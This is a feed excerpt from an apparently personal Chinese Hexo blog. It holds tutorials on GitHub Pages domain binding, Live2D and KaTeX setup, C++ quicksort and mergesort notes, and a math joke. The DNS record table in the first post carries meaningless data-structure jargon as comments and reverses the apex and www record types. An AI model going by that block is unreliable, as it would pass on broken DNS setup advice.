    <link href="https://touristdaughter.cyou/2025/04/24/Hexo%E5%8D%9A%E5%AE%A2%E5%88%A9%E7%94%A8GitHub%20Pages%E7%BB%91%E5%AE%9A%E5%9F%9F%E5%90%8D/"/>
    <id>https://touristdaughter.cyou/2025/04/24/Hexo%E5%8D%9A%E5%AE%A2%E5%88%A9%E7%94%A8GitHub%20Pages%E7%BB%91%E5%AE%9A%E5%9F%9F%E5%90%8D/</id>
    <published>2025-04-24T00:36:05.828Z</published>
    <updated>2025-04-24T10:17:19.346Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Hexo博客利用GitHub-Pages绑定域名"><a href="#Hexo博客利用GitHub-Pages绑定域名" class="headerlink" title="Hexo博客利用GitHub Pages绑定域名"></a>Hexo博客利用GitHub Pages绑定域名</h1><h2 id="1-找到自己的域名管理，解析"><a href="#1-找到自己的域名管理，解析" class="headerlink" title="1.找到自己的域名管理，解析"></a>1.找到自己的域名管理，解析</h2><p><img src="/img/yuming1.png"></p><h2 id="2-添加记录"><a href="#2-添加记录" class="headerlink" title="2.添加记录"></a>2.添加记录</h2><p><img src="/img/yuming2.png"></p><h2 id="3-添加两条记录分别如下"><a href="#3-添加两条记录分别如下" class="headerlink" title="3.添加两条记录分别如下"></a>3.添加两条记录分别如下</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 基于Trie树的域名解析加速</span><br><span class="line">记录类型  名称           值</span><br><span class="line">CNAME     @     username.github.io  # 后缀自动机跳转优化</span><br><span class="line">A         www    185.199.108.153    # 四叉树空间索引，IP即叶节点</span><br></pre></td></tr></table></figure><h3 id="A类型"><a href="#A类型" class="headerlink" title="A类型"></a>A类型</h3><h4 id="先ping一下你的github用户名-github-io，得到一个IP，即A记录值。"><a href="#先ping一下你的github用户名-github-io，得到一个IP，即A记录值。" class="headerlink" title="先ping一下你的github用户名.github.io，得到一个IP，即A记录值。"></a>先ping一下<code>你的github用户名.github.io</code>，得到一个IP，即A记录值。</h4><p><img src="/img/yuming3.png"></p><h4 id="添加A记录"><a href="#添加A记录" class="headerlink" title="添加A记录"></a>添加A记录</h4><p><img src="/img/yuming4.png"></p><h3 id="CNAME类型"><a href="#CNAME类型" class="headerlink" title="CNAME类型"></a>CNAME类型</h3><h4 id="添加CNAME记录"><a href="#添加CNAME记录" class="headerlink" title="添加CNAME记录"></a>添加CNAME记录</h4><p><img src="/img/yuming5.png"></p><h2 id="4-在-GitHub-仓库中添加-CNAME-文件"><a href="#4-在-GitHub-仓库中添加-CNAME-文件" class="headerlink" title="4.在 GitHub 仓库中添加 CNAME 文件"></a>4.在 GitHub 仓库中添加 <code>CNAME</code> 文件</h2><p>在 <code>GitHub</code> 仓库的根目录下创建一个名为 <code>CNAME</code> 的文件（无扩展名），文件内容为自定义域名。</p><p>示例：</p><p>如果的自定义域名是 <code>www.example.com</code>，则 CNAME 文件内容为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www.example.com</span><br></pre></td></tr></table></figure><p>如果使用的是顶级域名 <code>example.com</code>，则内容为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">example.com</span><br></pre></td></tr></table></figure><p>再在本地磁盘<code>hexo</code>目录下的<code>source文件夹</code>生成<code>CNAME</code>文件，里面写上你的域名。</p><h2 id="5-在GitHub上面添加自己的域名"><a href="#5-在GitHub上面添加自己的域名" class="headerlink" title="5.在GitHub上面添加自己的域名"></a>5.在GitHub上面添加自己的域名</h2><p><img src="/img/yuming6.png"><br><img src="/img/yuming7.png"><br><img src="/img/yuming8.png"></p><p>然后填写你的域名。</p><h2 id="6-添加TXT验证域名所有权"><a href="#6-添加TXT验证域名所有权" class="headerlink" title="6.添加TXT验证域名所有权"></a>6.添加TXT验证域名所有权</h2><h3 id="获取验证记录"><a href="#获取验证记录" class="headerlink" title="获取验证记录"></a>获取验证记录</h3><p>在 <code>GitHub Pages</code> 设置页面，如果需要验证域名所有权，<code>GitHub</code> 会提供一条 <code>TXT</code> 记录的值。<br><img src="/img/yuming10.png"></p><h3 id="添加-TXT-记录"><a href="#添加-TXT-记录" class="headerlink" title="添加 TXT 记录"></a>添加 <code>TXT</code> 记录</h3><p>回到域名注册商的管理面板，点击<code>解析</code>,来到DNS管理面板。</p><p>添加以下 <code>TXT</code> 记录：<br><img src="/img/yuming9.png"><br><img src="/img/yuming11.png"></p><p>保存设置，等待生效。</p><p>进入仓库<code>Settings</code>栏，填入<code>域名</code>，并勾选<code>Enforce HTTPS</code><br><img src="/img/yuming12.png"></p><h1 id="Done"><a href="#Done" class="headerlink" title="Done."></a>Done.</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Hexo博客利用GitHub-Pages绑定域名&quot;&gt;&lt;a href=&quot;#Hexo博客利用GitHub-Pages绑定域名&quot; class=&quot;headerlink&quot; title=&quot;Hexo博客利用GitHub Pages绑定域名&quot;&gt;&lt;/a&gt;Hexo博客利用GitHub</summary>
      
    
    
    
    <category term="关于本站、博客搭建" scheme="https://touristdaughter.cyou/categories/%E5%85%B3%E4%BA%8E%E6%9C%AC%E7%AB%99%E3%80%81%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
    
    
    <category term="Hexo" scheme="https://touristdaughter.cyou/tags/Hexo/"/>
    
    <category term="GitHub" scheme="https://touristdaughter.cyou/tags/GitHub/"/>
    
  </entry>
  
  <entry>
    <title>Hexo博客butterfly主题添加看板娘</title>
    <link href="https://touristdaughter.cyou/2025/04/20/Hexo%E5%8D%9A%E5%AE%A2butterfly%E4%B8%BB%E9%A2%98%E6%B7%BB%E5%8A%A0%E7%9C%8B%E6%9D%BF%E5%A8%98/"/>
    <id>https://touristdaughter.cyou/2025/04/20/Hexo%E5%8D%9A%E5%AE%A2butterfly%E4%B8%BB%E9%A2%98%E6%B7%BB%E5%8A%A0%E7%9C%8B%E6%9D%BF%E5%A8%98/</id>
    <published>2025-04-19T16:52:36.000Z</published>
    <updated>2025-04-21T15:08:08.909Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Hexo博客butterfly主题添加看板娘"><a href="#Hexo博客butterfly主题添加看板娘" class="headerlink" title="Hexo博客butterfly主题添加看板娘"></a>Hexo博客butterfly主题添加看板娘</h1><h1 id="第一步：安装插件"><a href="#第一步：安装插件" class="headerlink" title="第一步：安装插件"></a>第一步：安装插件</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save hexo-helper-live2d</span><br></pre></td></tr></table></figure><h1 id="第二步：安装模型"><a href="#第二步：安装模型" class="headerlink" title="第二步：安装模型"></a>第二步：安装模型</h1><p>使用<code>npm install &#123;packagename&#125;</code>进行安装模型，如：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install live2d-widget-model-shizuku -S</span><br></pre></td></tr></table></figure><h1 id="第三步：配置"><a href="#第三步：配置" class="headerlink" title="第三步：配置"></a>第三步：配置</h1><p>在站点配置文件<code>_config.yml</code>或者主题配置文件<code>_config.butterfly.yml</code>中新增如下内容：</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Live2D</span></span><br><span class="line"><span class="comment">## https://github.com/EYHN/hexo-helper-live2d</span></span><br><span class="line"><span class="attr">live2d:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="comment"># enable: false</span></span><br><span class="line">  <span class="attr">scriptFrom:</span> <span class="string">local</span> <span class="comment"># 默认</span></span><br><span class="line">  <span class="attr">pluginRootPath:</span> <span class="string">live2dw/</span> <span class="comment"># 插件在站点上的根目录(相对路径)</span></span><br><span class="line">  <span class="attr">pluginJsPath:</span> <span class="string">lib/</span> <span class="comment"># 脚本文件相对与插件根目录路径</span></span><br><span class="line">  <span class="attr">pluginModelPath:</span> <span class="string">assets/</span> <span class="comment"># 模型文件相对与插件根目录路径</span></span><br><span class="line">  <span class="comment"># scriptFrom: jsdelivr # jsdelivr CDN</span></span><br><span class="line">  <span class="comment"># scriptFrom: unpkg # unpkg CDN</span></span><br><span class="line">  <span class="comment"># scriptFrom: https://cdn.jsdelivr.net/npm/live2d-widget@3.x/lib/L2Dwidget.min.js # 你的自定义 url</span></span><br><span class="line">  <span class="attr">tagMode:</span> <span class="literal">false</span> <span class="comment"># 标签模式, 是否仅替换 live2d tag标签而非插入到所有页面中</span></span><br><span class="line">  <span class="attr">debug:</span> <span class="literal">false</span> <span class="comment"># 调试, 是否在控制台输出日志</span></span><br><span class="line">  <span class="attr">model:</span></span><br><span class="line">    <span class="attr">use:</span> <span class="string">live2d-widget-model-wanko</span> <span class="comment"># 第二步下载的模型</span></span><br><span class="line">    <span class="comment"># use: wanko # 博客根目录/live2d_models/ 下的目录名</span></span><br><span class="line">    <span class="comment"># use: ./wives/wanko # 相对于博客根目录的路径</span></span><br><span class="line">    <span class="comment"># use: https://cdn.jsdelivr.net/npm/live2d-widget-model-wanko@1.0.5/assets/wanko.model.json # 你的自定义 url</span></span><br><span class="line">  <span class="attr">display:</span></span><br><span class="line">    <span class="attr">position:</span> <span class="string">right</span></span><br><span class="line">    <span class="attr">width:</span> <span class="number">150</span></span><br><span class="line">    <span class="attr">height:</span> <span class="number">300</span></span><br><span class="line">  <span class="attr">mobile:</span></span><br><span class="line">    <span class="attr">show:</span> <span class="literal">true</span> <span class="comment"># 手机中是否展示</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Hexo博客butterfly主题添加看板娘&quot;&gt;&lt;a href=&quot;#Hexo博客butterfly主题添加看板娘&quot; class=&quot;headerlink&quot; title=&quot;Hexo博客butterfly主题添加看板娘&quot;&gt;&lt;/a&gt;Hexo博客butterfly主题添加看</summary>
      
    
    
    
    <category term="关于本站、博客搭建" scheme="https://touristdaughter.cyou/categories/%E5%85%B3%E4%BA%8E%E6%9C%AC%E7%AB%99%E3%80%81%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
    
    
  </entry>
  
  <entry>
    <title>基础算法</title>
    <link href="https://touristdaughter.cyou/2025/04/17/1.%E5%9F%BA%E7%A1%80%E7%AE%97%E6%B3%95/"/>
    <id>https://touristdaughter.cyou/2025/04/17/1.%E5%9F%BA%E7%A1%80%E7%AE%97%E6%B3%95/</id>
    <published>2025-04-17T08:09:39.279Z</published>
    <updated>2025-04-17T08:21:50.471Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>powered by <a href="https://www.acwing.com/">AcWing</a><br>本文总结记录了我的<a href="https://www.acwing.com/activity/content/11/">基础算法</a>作业完成情况</p></blockquote><h1 id="第一讲-基础算法"><a href="#第一讲-基础算法" class="headerlink" title="第一讲 基础算法"></a>第一讲 基础算法</h1><blockquote><p>完成情况：20&#x2F;20<br>包括排序、二分、高精度、前缀和与差分、双指针算法、位运算、离散化、区间合并等内容。</p></blockquote><h2 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;bits/stdc++.h&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">100010</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> q[N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">quick_sort</span><span class="params">(<span class="type">int</span> q[], <span class="type">int</span> l, <span class="type">int</span> r)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (l &gt;= r) <span class="keyword">return</span>;</span><br><span class="line">    <span class="built_in">swap</span>(q[l], q[l + <span class="built_in">rand</span>() % (r - l + <span class="number">1</span>)]);</span><br><span class="line">    <span class="type">int</span> i = l - <span class="number">1</span>, j = r + <span class="number">1</span>, x = q[l];</span><br><span class="line">    <span class="keyword">while</span> (i &lt; j) &#123;</span><br><span class="line">        <span class="keyword">do</span> i ++ ; <span class="keyword">while</span> (q[i] &lt; x);</span><br><span class="line">        <span class="keyword">do</span> j -- ; <span class="keyword">while</span> (q[j] &gt; x);</span><br><span class="line">        <span class="keyword">if</span> (i &lt; j) <span class="built_in">swap</span>(q[i], q[j]);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">quick_sort</span>(q, l, j);</span><br><span class="line">    <span class="built_in">quick_sort</span>(q, j + <span class="number">1</span>, r);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i ++ ) <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;q[i]);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">quick_sort</span>(q, <span class="number">0</span>, n - <span class="number">1</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i ++ ) <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, q[i]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;bits/stdc++.h&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">1e6</span> + <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="type">int</span> q[N], tmp[N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">merge_sort</span><span class="params">(<span class="type">int</span> q[], <span class="type">int</span> l, <span class="type">int</span> r)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (l &gt;= r) <span class="keyword">return</span> ;</span><br><span class="line">    <span class="type">int</span> mid = l + r &gt;&gt; <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">merge_sort</span>(q, l, mid), <span class="built_in">merge_sort</span>(q, mid + <span class="number">1</span>, r);</span><br><span class="line">    <span class="type">int</span> k = <span class="number">0</span>, i = l , j = mid + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (i &lt;= mid &amp;&amp; j &lt;= r)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (q[i] &lt;= q[j]) tmp[k ++ ] = q[i ++ ];</span><br><span class="line">        <span class="keyword">else</span> tmp[k ++ ] = q[j ++ ];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (i &lt;= mid) tmp[k ++ ] = q[i ++ ];</span><br><span class="line">    <span class="keyword">while</span> (j &lt;= r) tmp[k ++ ] = q[j ++ ];</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (i = l, j = <span class="number">0</span>; i &lt;= r; i ++, j ++ ) q[i] = tmp[j];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i ++ ) <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;q[i]);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">merge_sort</span>(q, <span class="number">0</span>, n - <span class="number">1</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i ++ ) <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, q[i]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="第二讲-数据结构"><a href="#第二讲-数据结构" class="headerlink" title="第二讲 数据结构"></a>第二讲 数据结构</h1><blockquote><p>完成情况：17&#x2F;17<br>包括单链表，双链表，栈，队列，单调栈，单调队列，KMP，Trie，并查集，堆，哈希表等内容。</p></blockquote><h1 id="第三讲-搜索与图论"><a href="#第三讲-搜索与图论" class="headerlink" title="第三讲 搜索与图论"></a>第三讲 搜索与图论</h1><blockquote><p>完成情况：17&#x2F;17<br>包括DFS，BFS，树与图的深度优先遍历，树与图的广度优先遍历，拓扑排序，Dijkstra，bellman-ford，spfa，Floyd，Prim，Kruskal，染色法判定二分图，匈牙利算法等内容。</p></blockquote><h1 id="第四讲-数学知识"><a href="#第四讲-数学知识" class="headerlink" title="第四讲 数学知识"></a>第四讲 数学知识</h1><blockquote><p>完成情况：26&#x2F;26<br>包括质数，约数，欧拉函数，快速幂，扩展欧几里得算法，中国剩余定理，高斯消元，求组合数，容斥原理，博弈论等内容。</p></blockquote><h1 id="第五讲-动态规划"><a href="#第五讲-动态规划" class="headerlink" title="第五讲 动态规划"></a>第五讲 动态规划</h1><blockquote><p>完成情况：11&#x2F;18<br>包括背包问题，线性DP，区间DP，计数类DP，数位统计DP，状态压缩DP，树形DP，记忆化搜索等内容。</p></blockquote><h1 id="第六讲-贪心"><a href="#第六讲-贪心" class="headerlink" title="第六讲 贪心"></a>第六讲 贪心</h1><blockquote><p>完成情况：2&#x2F;8<br>包括区间问题，Huffman树，排序不等式，绝对值不等式，推公式等内容。</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;powered by &lt;a href=&quot;https://www.acwing.com/&quot;&gt;AcWing&lt;/a&gt;&lt;br&gt;本文总结记录了我的&lt;a href=&quot;https://www.acwing.com/activity/content/11/&quot;&gt;基础</summary>
      
    
    
    
    <category term="我的基础算法笔记" scheme="https://touristdaughter.cyou/categories/%E6%88%91%E7%9A%84%E5%9F%BA%E7%A1%80%E7%AE%97%E6%B3%95%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="AcWing" scheme="https://touristdaughter.cyou/tags/AcWing/"/>
    
    <category term="Algorithm" scheme="https://touristdaughter.cyou/tags/Algorithm/"/>
    
    <category term="C++" scheme="https://touristdaughter.cyou/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>hexo+butterfly使用数学公式katex</title>
    <link href="https://touristdaughter.cyou/2025/04/13/hexo+butterfly%E4%BD%BF%E7%94%A8%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8Fkatex/"/>
    <id>https://touristdaughter.cyou/2025/04/13/hexo+butterfly%E4%BD%BF%E7%94%A8%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8Fkatex/</id>
    <published>2025-04-13T14:55:01.984Z</published>
    <updated>2025-04-13T15:13:19.158Z</updated>
    
    <content type="html"><![CDATA[<h1 id="hexo-butterfly使用数学公式katex"><a href="#hexo-butterfly使用数学公式katex" class="headerlink" title="hexo+butterfly使用数学公式katex"></a>hexo+butterfly使用数学公式katex</h1><h2 id="1-更换插件"><a href="#1-更换插件" class="headerlink" title="1.更换插件"></a>1.更换插件</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">npm un hexo-renderer-marked --save # 卸载 marked 插件</span><br><span class="line">npm un hexo-renderer-kramed --save # 卸载 kramed 插件</span><br><span class="line">npm i hexo-renderer-markdown-it --save # 安装渲染插件</span><br><span class="line">npm install @neilsustc/markdown-it-katex --save # 安装katex插件</span><br></pre></td></tr></table></figure><h2 id="2-butterfly配置启动latex插件"><a href="#2-butterfly配置启动latex插件" class="headerlink" title="2.butterfly配置启动latex插件"></a>2.butterfly配置启动latex插件</h2><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Math (數學)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># KaTeX</span></span><br><span class="line"><span class="attr">katex:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">per_page:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">hide_scrollbar:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><h2 id="3-博客yml配置中增加"><a href="#3-博客yml配置中增加" class="headerlink" title="3.博客yml配置中增加"></a>3.博客yml配置中增加</h2><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">markdown:</span></span><br><span class="line"> <span class="attr">plugins:</span></span><br><span class="line">   <span class="bullet">-</span> <span class="attr">plugin:</span></span><br><span class="line">     <span class="attr">name:</span> <span class="string">&#x27;@neilsustc/markdown-it-katex&#x27;</span></span><br><span class="line">     <span class="attr">options:</span></span><br><span class="line">       <span class="attr">strict:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure><h2 id="4-博客页面配置开启latex"><a href="#4-博客页面配置开启latex" class="headerlink" title="4.博客页面配置开启latex"></a>4.博客页面配置开启latex</h2><figure class="highlight md"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: bert详解</span><br><span class="line">date: 2025-04-13 14:51:21</span><br><span class="line">katex: true</span><br><span class="line">category:</span><br><span class="line"><span class="bullet">  -</span> ai</span><br><span class="line">tag:</span><br><span class="line"><span class="section">  - ai</span></span><br><span class="line"><span class="section">---</span></span><br></pre></td></tr></table></figure><h2 id="5-letex语法如下："><a href="#5-letex语法如下：" class="headerlink" title="5.letex语法如下："></a>5.letex语法如下：</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$concurrency = cost_\text&#123;avg&#125; \times qps \quad (1)$</span><br></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$$</span><br><span class="line">\begin&#123;equation&#125;</span><br><span class="line">\mathcal&#123;F&#125; = \begin&#123;cases&#125;</span><br><span class="line">    \infty &amp; \text&#123;if &#125; \mathcal&#123;M&#125;_&#123;measure&#125; &lt; \alpha \times \mathcal&#123;M&#125;_&#123;expect&#125; \\</span><br><span class="line">    \mathcal&#123;M&#125;_\text&#123;expect&#125; / \mathcal&#123;M&#125;_\text&#123;measure&#125; &amp; \text&#123;if &#125; \alpha \times \mathcal&#123;M&#125;_&#123;expect&#125; &lt; \mathcal&#123;M&#125;_&#123;measure&#125; &lt; \mathcal&#123;M&#125;_&#123;expect&#125; \\</span><br><span class="line">    \sqrt&#123;\frac&#123;\mathcal&#123;M&#125;_&#123;expect&#125;&#125;&#123;\mathcal&#123;M&#125;_&#123;measure&#125;&#125;&#125; &amp; \text&#123;if &#125; \mathcal&#123;M&#125;_&#123;measure&#125; \ge \mathcal&#123;M&#125;_&#123;expect&#125;</span><br><span class="line">\end&#123;cases&#125;</span><br><span class="line">\end&#123;equation&#125;</span><br><span class="line">$$</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;hexo-butterfly使用数学公式katex&quot;&gt;&lt;a href=&quot;#hexo-butterfly使用数学公式katex&quot; class=&quot;headerlink&quot; title=&quot;hexo+butterfly使用数学公式katex&quot;&gt;&lt;/a&gt;hexo+butter</summary>
      
    
    
    
    <category term="关于本站、博客搭建" scheme="https://touristdaughter.cyou/categories/%E5%85%B3%E4%BA%8E%E6%9C%AC%E7%AB%99%E3%80%81%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
    
    
    <category term="Hexo" scheme="https://touristdaughter.cyou/tags/Hexo/"/>
    
    <category term="Butterfly" scheme="https://touristdaughter.cyou/tags/Butterfly/"/>
    
  </entry>
  
  <entry>
    <title>【段子】千禧年难题奶茶化</title>
    <link href="https://touristdaughter.cyou/2025/04/13/[%E6%AE%B5%E5%AD%90]%E5%8D%83%E7%A6%A7%E5%B9%B4%E9%9A%BE%E9%A2%98%E5%A5%B6%E8%8C%B6%E5%8C%96/"/>
    <id>https://touristdaughter.cyou/2025/04/13/[%E6%AE%B5%E5%AD%90]%E5%8D%83%E7%A6%A7%E5%B9%B4%E9%9A%BE%E9%A2%98%E5%A5%B6%E8%8C%B6%E5%8C%96/</id>
    <published>2025-04-13T09:26:57.809Z</published>
    <updated>2025-04-13T14:38:39.165Z</updated>
    
    <content type="html"><![CDATA[<h1 id="【段子】千禧年难题奶茶化"><a href="#【段子】千禧年难题奶茶化" class="headerlink" title="【段子】千禧年难题奶茶化"></a>【段子】千禧年难题奶茶化</h1><h4 id="潜入克雷数学研究所档案室，你掏出毛笔在《七大难题》羊皮纸上狂草："><a href="#潜入克雷数学研究所档案室，你掏出毛笔在《七大难题》羊皮纸上狂草：" class="headerlink" title="潜入克雷数学研究所档案室，你掏出毛笔在《七大难题》羊皮纸上狂草："></a>潜入克雷数学研究所档案室，你掏出毛笔在《七大难题》羊皮纸上狂草：</h4><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">第八难题：奶茶最优搅拌定理  </span><br><span class="line">设珍珠体积为V，奶茶密度ρ，吸管半径r，则存在唯一搅拌次数n，使得  </span><br><span class="line">n = ⌈(3Vρ)/(π r²)⌉ + ϵ  </span><br><span class="line">其中ϵ为口味偏好修正项（ϵ∈&#123;0,1&#125;）  </span><br><span class="line">悬赏：终身奶茶免单权</span><br></pre></td></tr></table></figure><h4 id="此刻全球数学家突然集体转向奶茶店，黎曼猜想的证明进度因此延缓13-7-！"><a href="#此刻全球数学家突然集体转向奶茶店，黎曼猜想的证明进度因此延缓13-7-！" class="headerlink" title="此刻全球数学家突然集体转向奶茶店，黎曼猜想的证明进度因此延缓13.7%！"></a>此刻全球数学家突然集体转向奶茶店，黎曼猜想的证明进度因此延缓13.7%！</h4>]]></content>
    
    
      
      
